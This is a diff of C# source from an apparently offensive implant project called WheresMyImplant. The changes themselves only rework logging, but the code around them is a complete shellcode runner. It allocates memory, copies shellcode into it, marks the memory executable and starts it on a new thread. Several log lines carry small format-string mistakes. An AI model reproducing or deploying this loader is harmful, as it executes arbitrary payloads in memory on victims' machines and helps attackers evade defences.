@@ -2,8 +2,8 @@
 using System.Runtime.InteropServices;
 using System.Text;
 
-using Unmanaged.Headers;
-using Unmanaged.Libraries;
+using MonkeyWorks.Unmanaged.Headers;
+using MonkeyWorks.Unmanaged.Libraries;
 
 namespace WheresMyImplant
 {
@@ -41,24 +41,24 @@ namespace WheresMyImplant
             IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
             if (IntPtr.Zero == lpBaseAddress)
             {
-                WriteOutputBad("Unable to allocate memory");
+                Console.WriteLine("[-] Unable to allocate memory");
                 return;
             }
-            WriteOutput(String.Format("Allocated {0} bytes at 0x{0}", dwSize, lpBaseAddress.ToString("X4")));
-            WriteOutput("Memory Protection Set to PAGE_READWRITE");
+            Console.WriteLine("[+] Allocated {0} bytes at 0x{0}", dwSize, lpBaseAddress.ToString("X4"));
+            Console.WriteLine("[*] Memory Protection Set to PAGE_READWRITE");
 
             ////////////////////////////////////////////////////////////////////////////////
             Marshal.Copy(shellCodeBytes, 0, lpBaseAddress, shellCodeBytes.Length);
-            WriteOutput(String.Format("Injected ShellCode at address 0x{0}", lpBaseAddress.ToString("X4")));
+            Console.WriteLine("Injected ShellCode at address 0x{0}", lpBaseAddress.ToString("X4"));
 
             ////////////////////////////////////////////////////////////////////////////////
             Winnt.MEMORY_PROTECTION_CONSTANTS lpflOldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
             if (!kernel32.VirtualProtect(lpBaseAddress, dwSize, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref lpflOldProtect))
             {
-                WriteOutputBad("VirtualProtectEx Failed");
+                Console.WriteLine("[-] VirtualProtectEx Failed");
                 return;
             }
-            WriteOutput("Altering Memory Protections to PAGE_EXECUTE_READ");
+            Console.WriteLine("[+] Updated Memory Protections to PAGE_EXECUTE_READ");
 
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpThreadAttributes = IntPtr.Zero;
@@ -66,14 +66,14 @@ namespace WheresMyImplant
             IntPtr lpParameter = IntPtr.Zero;
             UInt32 dwCreationFlags = 0;
             UInt32 threadId = 0;
-            WriteOutput("Attempting to start thread");
+            Console.WriteLine("[*] Attempting to start thread");
             hThread = kernel32.CreateThread(lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
             if (IntPtr.Zero == hThread)
             {
-                WriteOutputBad("CreateRemoteThread Failed");
+                Console.WriteLine("[-] CreateRemoteThread Failed");
                 return;
             }
-            WriteOutput(String.Format("Started Thread: ", hThread.ToString("X4")));
+            Console.WriteLine("[+] Started Thread: ", hThread.ToString("X4"));
 
             ////////////////////////////////////////////////////////////////////////////////
             kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
